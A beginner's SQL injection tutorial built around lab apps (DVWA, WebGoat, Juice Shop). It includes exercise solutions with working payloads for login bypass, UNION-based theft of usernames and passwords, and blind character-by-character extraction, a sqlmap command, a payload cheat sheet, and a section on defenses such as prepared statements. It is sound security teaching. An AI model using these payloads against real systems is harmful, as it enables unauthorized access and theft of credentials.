# 🗄️ SQL Injection (SQLi) Tutorial

**Difficulty**: ⭐⭐⭐ (Beginner)  
**Time Required**: 2-3 hours  
**Applications**: DVWA, WebGoat, Juice Shop

## 📚 Table of Contents
1. [What is SQL Injection?](#what-is-sql-injection)
2. [How SQL Injection Works](#how-sql-injection-works)
3. [Types of SQL Injection](#types-of-sql-injection)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand how SQL injection vulnerabilities occur
- ✅ Identify SQL injection points in web applications
- ✅ Perform basic SQL injection attacks
- ✅ Extract data from databases
- ✅ Understand and implement proper defenses

---

## What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered for string literal escape characters embedded in SQL statements.

### 🎬 Real-World Impact

SQL Injection has been responsible for major breaches:
- **2019**: Fortnite had an SQL injection vulnerability affecting millions of users
- **2018**: Under Armour's MyFitnessPal breach (150 million accounts)
- **2015**: TalkTalk telecom breach (157,000 customers' data)

### 🔍 How to Spot SQL Injection

Look for:
- Login forms
- Search boxes
- URL parameters
- Any input field that might interact with a database

---

## How SQL Injection Works

### The Vulnerable Code

Here's an example of vulnerable PHP code:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
```

### The Attack

If an attacker enters:
- Username: `admin' --`
- Password: `anything`

The query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `--` comments out the rest of the query, bypassing the password check!

---

## Types of SQL Injection

### 1. Classic SQL Injection
Direct injection into the query with immediate results.

### 2. Blind SQL Injection
No direct output, but you can infer information through:
- **Boolean-based**: Different responses for true/false conditions
- **Time-based**: Using delays to extract information

### 3. Error-based SQL Injection
Database errors reveal information about the structure.

### 4. Union-based SQL Injection
Using UNION to combine results from multiple queries.

---

## Hands-On Practice

### 🏃 Exercise 1: Basic Login Bypass (DVWA)

**Setup**: Start DVWA and navigate to SQL Injection page  
**Goal**: Login without knowing the password

<details>
<summary>💡 Hint 1: Where to start?</summary>

Look at the login form. You have two input fields: username and password. Think about how these might be used in an SQL query.

</details>

<details>
<summary>💡 Hint 2: What SQL query might be running?</summary>

The backend probably uses something like:
```sql
SELECT * FROM users WHERE user='[username]' AND password='[password]'
```

How can you manipulate this?

</details>

<details>
<summary>💡 Hint 3: Breaking the query</summary>

Try using a single quote `'` in the username field. What happens? This might tell you if the input is vulnerable.

</details>

<details>
<summary>🔓 Solution</summary>

Enter in the username field:
```
admin' --
```

Or:
```
admin' or '1'='1
```

**Explanation**: 
- The first payload comments out the password check
- The second makes the WHERE clause always true

**Full query becomes**:
```sql
SELECT * FROM users WHERE user='admin' --' AND password='whatever'
```

</details>

---

### 🏃 Exercise 2: Data Extraction (DVWA)

**Goal**: Extract all usernames from the database

<details>
<summary>💡 Hint 1: Understanding the output</summary>

First, enter a normal ID like `1`. See how the data is displayed? You'll need to understand the number of columns being returned.

</details>

<details>
<summary>💡 Hint 2: Finding column count</summary>

Try using ORDER BY to find the number of columns:
```
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```

Keep increasing until you get an error.

</details>

<details>
<summary>💡 Hint 3: Using UNION</summary>

Once you know the column count, you can use UNION SELECT. If there are 2 columns:
```
1' UNION SELECT null, null--
```

Then replace nulls with data you want to extract.

</details>

<details>
<summary>🔓 Solution</summary>

**Step 1**: Find column count
```
1' ORDER BY 3--
```
(Error at 3, so there are 2 columns)

**Step 2**: Extract database name
```
1' UNION SELECT database(), null--
```

**Step 3**: Extract table names
```
1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()--
```

**Step 4**: Extract usernames
```
1' UNION SELECT user, password FROM users--
```

</details>

---

### 🏃 Exercise 3: Blind SQL Injection (WebGoat)

**Goal**: Extract the password for user 'tom' without seeing direct output

<details>
<summary>💡 Hint 1: Boolean-based approach</summary>

You can ask yes/no questions. Try:
```
tom' AND '1'='1
tom' AND '1'='2
```

Do you see different responses?

</details>

<details>
<summary>💡 Hint 2: Extracting one character at a time</summary>

You can check if the first character of the password is 'a':
```
tom' AND SUBSTRING(password,1,1)='a
```

</details>

<details>
<summary>💡 Hint 3: Automating with ASCII</summary>

Instead of guessing each letter, use ASCII values:
```
tom' AND ASCII(SUBSTRING(password,1,1))>65
```

This is a binary search approach!

</details>

<details>
<summary>🔓 Solution</summary>

**Manual approach**:
```python
# For each position in the password
for position in range(1, 20):
    # For each possible character
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
        payload = f"tom' AND SUBSTRING(password,{position},1)='{char}"
        # Send request and check response
```

**Automated with sqlmap**:
```bash
sqlmap -u "http://localhost:8082/WebGoat/SqlInjection/challenge" --cookie="JSESSIONID=..." --data="username_reg=tom&email_reg=*&password_reg=test&confirm_password_reg=test" -p email_reg --technique=B --string="already exists"
```

</details>

---

### 🏃 Challenge: The Ultimate Test

**Application**: Juice Shop  
**Goal**: Login as the admin and change the price of the "Apple Juice" to $0.01

<details>
<summary>🎯 Challenge Hints</summary>

1. Find the login bypass first
2. Look for the products API endpoint
3. SQL injection isn't just for login forms!
4. Check the search functionality

</details>

<details>
<summary>🔓 Challenge Solution</summary>

**Step 1**: Login bypass
```
' or 1=1--
```

**Step 2**: Find products endpoint
Browse the API or check network tab: `/rest/products/search?q=`

**Step 3**: Extract product information
```
apple')) UNION SELECT id,email,password,null,null,null,null,null,null FROM users--
```

**Step 4**: Update product (requires finding admin functionality)
This actually requires finding the admin panel, which might involve directory enumeration or checking JavaScript files.

</details>

---

## Defense Strategies

### 🛡️ Primary Defenses

1. **Parameterized Queries / Prepared Statements**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

2. **Stored Procedures**
```sql
CREATE PROCEDURE sp_getUser
  @Username NVARCHAR(50),
  @Password NVARCHAR(50)
AS
  SELECT * FROM users WHERE username = @Username AND password = @Password
```

3. **Input Validation**
```python
import re
if not re.match("^[a-zA-Z0-9_]+$", username):
    raise ValueError("Invalid username")
```

4. **Escaping User Input**
```php
$username = mysqli_real_escape_string($connection, $username);
```

### 🛡️ Additional Defenses

- **Least Privilege**: Database users should have minimal permissions
- **WAF (Web Application Firewall)**: Can block common SQL injection patterns
- **Regular Security Audits**: Automated scanning and manual penetration testing

---

## 📊 Quick Reference Cheat Sheet

### Common SQL Injection Payloads

| Purpose | Payload |
|---------|---------|
| Basic bypass | `' or '1'='1` |
| Comment rest | `admin'--` |
| Union select | `' UNION SELECT null,null--` |
| Time delay (MySQL) | `' AND SLEEP(5)--` |
| Error based | `' AND 1=CONVERT(int, @@version)--` |

### Database-Specific Syntax

| Database | Version Query | Comment Syntax |
|----------|--------------|----------------|
| MySQL | `SELECT @@version` | `-- ` or `#` |
| PostgreSQL | `SELECT version()` | `--` |
| MSSQL | `SELECT @@version` | `--` |
| Oracle | `SELECT * FROM v$version` | `--` |

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify potential SQL injection points
- [ ] Perform a basic authentication bypass
- [ ] Extract data using UNION SELECT
- [ ] Perform blind SQL injection (boolean-based)
- [ ] Explain at least 3 defense mechanisms

---

## Additional Resources

### 🔧 Tools
- **sqlmap**: Automated SQL injection tool
- **Burp Suite**: Web proxy for manual testing
- **OWASP ZAP**: Alternative to Burp Suite

### 📖 Further Reading
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

### 🎥 Video Tutorials
- [Computerphile - SQL Injection Explained](https://www.youtube.com/watch?v=ciNHn38EyRc)
- [LiveOverflow - SQL Injection Series](https://www.youtube.com/playlist?list=PLhixgUqwRTjx2BmNF5-GddyqZcizwLLGP)

---

**Next Tutorial**: [Cross-Site Scripting (XSS)](xss.md) → 